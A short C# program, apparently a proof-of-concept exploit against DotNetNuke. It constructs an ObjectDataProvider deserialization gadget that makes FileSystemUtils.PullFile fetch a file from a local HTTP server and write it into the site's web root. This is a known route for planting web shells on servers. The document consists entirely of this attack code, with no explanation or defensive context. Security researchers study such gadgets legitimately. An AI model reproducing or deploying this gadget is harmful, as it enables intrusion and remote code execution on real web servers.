// REFERENCE
// DotNetNuke
// PresentationFramework
using System; 
using System.IO; 
using System.Xml.Serialization; 
using DotNetNuke.Common.Utilities;
using System.Windows.Data;

namespace ODPSerializer 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
            ObjectDataProvider myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new FileSystemUtils();
            myODP.MethodName = "PullFile";
            myODP.MethodParameters.Add("http://localhost:8000/test.txt");

            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dnn9/test.txt");
            Console.WriteLine("Done!");
        } 
    } 
} 
